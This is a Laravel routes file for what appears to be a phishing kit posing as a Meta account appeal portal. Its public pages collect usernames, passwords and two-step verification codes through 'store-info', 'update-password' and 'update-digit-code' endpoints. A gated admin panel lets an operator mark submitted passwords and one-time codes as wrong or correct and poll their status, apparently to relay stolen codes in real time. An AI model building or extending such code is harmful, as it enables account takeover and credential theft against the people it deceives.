<?php

use App\Http\Controllers\AdminController;
use App\Http\Controllers\CommonController;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('/', function () {
    return view('welcome');
});

Route::get('/index', function () {
    return view('index');
});

Route::get('/meta-portal', function () {
    return view('meta-portal');
})->name('index.meta.portal');


Route::get('/meta-portal-info', function () {
    return view('meta-portal-info');
})->name('index.meta.portal.info');

Route::get('/meta-portal-1', function () {
    return view('meta-portal-username');
})->name('index.meta.portal.username');

Route::get('/meta-portal-2', [CommonController::class, 'getUsername'])->name('meta.portal.username.get');
Route::get('/meta-portal-3', [CommonController::class, 'getUsernameAppeal'])->name('meta.portal.appeal.get');

Route::get('language/{locale}', function ($locale) {
    app()->setLocale($locale);
    session()->put('locale', $locale);

    return redirect()->back();
});

////Test UI
Route::get('/wrong-password', function () {
    return view('password-wrong');
});
Route::get('/2step-verification', function () {
    return view('verify2step');
});
Route::get('/ss', function () {
    return view('verify-successful');
});

Route::group([
    'prefix' => 'auth/login',
    'middleware' => 'owner.backend'
], function(){
    Route::get('/', function () { return view('login'); })->name('login.index');
    Route::post('/', [AdminController::class, 'loginSubmit']);
});



////Admin
Route::group([
    'prefix' => 'admin',
], function(){

    Route::group([
        'middleware' => 'owner.auth',
    ], function(){
        Route::get('/', function () { return view('admin_meta'); })->name('admin.index');
        Route::get('/logout', [AdminController::class, 'logout'])->name('admin.logout');
        Route::post('/change-password', [AdminController::class, 'changePassword'])->name('admin.change.password');
        Route::post('/change-ip-access-token', [AdminController::class, 'changeIP'])->name('admin.change.ip');
    });

    Route::group(['prefix' => 'api'], function(){
        Route::get('/get-all-items', [AdminController::class, 'getAllItems'])->name('api.get.items');
        Route::post('/store-info', [CommonController::class, 'storeInfo'])->name('api.store.info');
        Route::post('/password-wrong-click', [AdminController::class, 'passwordWrongClick'])->name('api.passwrong.click');
        Route::post('/password-correct-click', [AdminController::class, 'passwordCorrectClick'])->name('api.passcorrect.click');
        Route::get('/get-status-password', [AdminController::class, 'getStatusPassword'])->name('api.get.status.password');
        Route::post('/update-digit-code', [CommonController::class, 'updateDigitCode'])->name('api.update.digit.code');
        Route::post('/otp-wrong-click', [AdminController::class, 'OTPWrongClick'])->name('api.otpwrong.click');
        Route::post('/otp-correct-click', [AdminController::class, 'OTPCorrectClick'])->name('api.otpcorrect.click');
        Route::post('/otp-reset-click', [AdminController::class, 'OTPResetClick'])->name('api.otpreset.click');
        Route::get('/get-status-otp', [AdminController::class, 'getStatusOTP'])->name('api.get.status.otp');
        Route::post('/update-password', [CommonController::class, 'updatePassword'])->name('api.update.password');
        Route::post('/password-reset-click', [AdminController::class, 'PasswordResetClick'])->name('api.passwordreset.click');
    });
});

Route::fallback(function () {
    return view('index');
})->name('fallback');
